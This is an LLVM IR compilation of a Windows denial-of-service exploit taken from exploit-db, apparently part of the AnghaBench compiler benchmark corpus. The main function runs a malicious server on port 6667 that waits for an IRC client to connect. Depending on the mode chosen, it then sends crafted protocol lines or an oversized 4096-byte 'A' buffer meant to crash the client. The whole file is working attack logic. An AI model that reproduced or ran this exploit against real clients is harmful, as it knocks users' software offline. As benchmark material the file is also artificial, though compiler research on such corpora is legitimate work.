; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21821.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21821.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i32 }

@SOCKET_ERROR = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"raw\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"part\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"data\00", align 1
@.str.3 = private unnamed_addr constant [44 x i8] c"Listening on port 6667 for connections....\0A\00", align 1
@.str.4 = private unnamed_addr constant [34 x i8] c"ERROR: WSA Initialization failed.\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@s = common dso_local global i64 0, align 8
@INVALID_SOCKET = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [41 x i8] c"ERROR: Could Not Create Socket. Exiting\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [21 x i8] c"ERROR Binding Socket\00", align 1
@.str.7 = private unnamed_addr constant [38 x i8] c"ERROR: Couldnt Make Listening Socket\0A\00", align 1
@.str.8 = private unnamed_addr constant [35 x i8] c"Client Connected, Sending Payload\0A\00", align 1
@PART = common dso_local global i8* null, align 8
@SERVER = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.10 = private unnamed_addr constant [9 x i8] c"Exiting\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.TYPE_4__, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @SOCKET_ERROR, align 4
  store i32 %11, i32* %6, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 2
  br i1 %13, label %14, label %16

14:                                               ; preds = %2
  %15 = call i32 (...) @usage()
  store i32 1, i32* %3, align 4
  br label %150

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 1
  %19 = load i8*, i8** %18, align 8
  %20 = call i64 @strcmp(i8* %19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %21 = icmp ne i64 %20, 0
  br i1 %21, label %25, label %22

22:                                               ; preds = %16
  %23 = load i32, i32* %4, align 4
  %24 = icmp slt i32 %23, 3
  br i1 %24, label %43, label %25

25:                                               ; preds = %22, %16
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strcmp(i8* %28, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %30 = icmp ne i64 %29, 0
  br i1 %30, label %31, label %45

31:                                               ; preds = %25
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @strcmp(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %36 = icmp ne i64 %35, 0
  br i1 %36, label %37, label %45

37:                                               ; preds = %31
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i64 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  %42 = icmp ne i64 %41, 0
  br i1 %42, label %43, label %45

43:                                               ; preds = %37, %22
  %44 = call i32 (...) @usage()
  store i32 1, i32* %3, align 4
  br label %150

45:                                               ; preds = %37, %31, %25
  %46 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.3, i64 0, i64 0))
  %47 = call i32 @MAKEWORD(i32 1, i32 1)
  %48 = call i64 @WSAStartup(i32 %47, i32* %7)
  %49 = icmp ne i64 %48, 0
  br i1 %49, label %50, label %52

50:                                               ; preds = %45
  %51 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %150

52:                                               ; preds = %45
  %53 = load i32, i32* @PF_INET, align 4
  %54 = load i32, i32* @SOCK_STREAM, align 4
  %55 = load i32, i32* @IPPROTO_TCP, align 4
  %56 = call i64 @socket(i32 %53, i32 %54, i32 %55)
  store i64 %56, i64* @s, align 8
  %57 = load i64, i64* @s, align 8
  %58 = load i64, i64* @INVALID_SOCKET, align 8
  %59 = icmp eq i64 %57, %58
  br i1 %59, label %60, label %63

60:                                               ; preds = %52
  %61 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.5, i64 0, i64 0))
  %62 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  br label %150

63:                                               ; preds = %52
  %64 = call i32 @htons(i32 6667)
  %65 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %8, i32 0, i32 2
  store i32 %64, i32* %65, align 4
  %66 = load i32, i32* @AF_INET, align 4
  %67 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %8, i32 0, i32 1
  store i32 %66, i32* %67, align 4
  %68 = load i32, i32* @INADDR_ANY, align 4
  %69 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %8, i32 0, i32 0
  %70 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %69, i32 0, i32 0
  store i32 %68, i32* %70, align 4
  %71 = load i64, i64* @s, align 8
  %72 = ptrtoint %struct.TYPE_4__* %8 to i32
  %73 = call i32 @bind(i64 %71, i32 %72, i32 4)
  store i32 %73, i32* %9, align 4
  %74 = load i32, i32* %9, align 4
  %75 = load i32, i32* @SOCKET_ERROR, align 4
  %76 = icmp eq i32 %74, %75
  br i1 %76, label %77, label %80

77:                                               ; preds = %63
  %78 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0))
  %79 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  br label %150

80:                                               ; preds = %63
  %81 = load i64, i64* @s, align 8
  %82 = call i32 @listen(i64 %81, i32 10)
  %83 = load i32, i32* @SOCKET_ERROR, align 4
  %84 = icmp eq i32 %82, %83
  br i1 %84, label %85, label %88

85:                                               ; preds = %80
  %86 = call i32 @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.7, i64 0, i64 0))
  %87 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  br label %150

88:                                               ; preds = %80
  br label %89

89:                                               ; preds = %93, %88
  %90 = load i32, i32* %6, align 4
  %91 = load i32, i32* @SOCKET_ERROR, align 4
  %92 = icmp eq i32 %90, %91
  br i1 %92, label %93, label %96

93:                                               ; preds = %89
  %94 = load i64, i64* @s, align 8
  %95 = call i32 @accept(i64 %94, i32* null, i32* null)
  store i32 %95, i32* %6, align 4
  br label %89

96:                                               ; preds = %89
  %97 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.8, i64 0, i64 0))
  %98 = load i8**, i8*** %5, align 8
  %99 = getelementptr inbounds i8*, i8** %98, i64 1
  %100 = load i8*, i8** %99, align 8
  %101 = call i64 @strcmp(i8* %100, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %102 = icmp ne i64 %101, 0
  br i1 %102, label %109, label %103

103:                                              ; preds = %96
  %104 = load i32, i32* %6, align 4
  %105 = load i8*, i8** @PART, align 8
  %106 = load i8*, i8** @PART, align 8
  %107 = call i32 @strlen(i8* %106)
  %108 = call i32 @send(i32 %104, i8* %105, i32 %107, i32 0)
  br label %109

109:                                              ; preds = %103, %96
  %110 = load i8**, i8*** %5, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 1
  %112 = load i8*, i8** %111, align 8
  %113 = call i64 @strcmp(i8* %112, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %114 = icmp ne i64 %113, 0
  br i1 %114, label %132, label %115

115:                                              ; preds = %109
  %116 = load i32, i32* %6, align 4
  %117 = load i8*, i8** @SERVER, align 8
  %118 = load i8*, i8** @SERVER, align 8
  %119 = call i32 @strlen(i8* %118)
  %120 = call i32 @send(i32 %116, i8* %117, i32 %119, i32 0)
  %121 = load i32, i32* %6, align 4
  %122 = load i8**, i8*** %5, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 2
  %124 = load i8*, i8** %123, align 8
  %125 = load i8**, i8*** %5, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 2
  %127 = load i8*, i8** %126, align 8
  %128 = call i32 @strlen(i8* %127)
  %129 = call i32 @send(i32 %121, i8* %124, i32 %128, i32 0)
  %130 = load i32, i32* %6, align 4
  %131 = call i32 @send(i32 %130, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1, i32 0)
  br label %132

132:                                              ; preds = %115, %109
  %133 = load i8**, i8*** %5, align 8
  %134 = getelementptr inbounds i8*, i8** %133, i64 1
  %135 = load i8*, i8** %134, align 8
  %136 = call i64 @strcmp(i8* %135, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  %137 = icmp ne i64 %136, 0
  br i1 %137, label %146, label %138

138:                                              ; preds = %132
  %139 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %140 = call i32 @memset(i8* %139, i8 signext 65, i32 4096)
  %141 = load i32, i32* %6, align 4
  %142 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %143 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %144 = call i32 @strlen(i8* %143)
  %145 = call i32 @send(i32 %141, i8* %142, i32 %144, i32 0)
  br label %146

146:                                              ; preds = %138, %132
  %147 = call i32 @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i64 0, i64 0))
  %148 = call i32 @sleep(i32 100)
  %149 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  br label %150

150:                                              ; preds = %146, %85, %77, %60, %50, %43, %14
  %151 = load i32, i32* %3, align 4
  ret i32 %151
}

declare dso_local i32 @usage(...) #1

declare dso_local i64 @strcmp(i8*, i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i64 @socket(i32, i32, i32) #1

declare dso_local i32 @WSACleanup(...) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @bind(i64, i32, i32) #1

declare dso_local i32 @listen(i64, i32) #1

declare dso_local i32 @accept(i64, i32*, i32*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
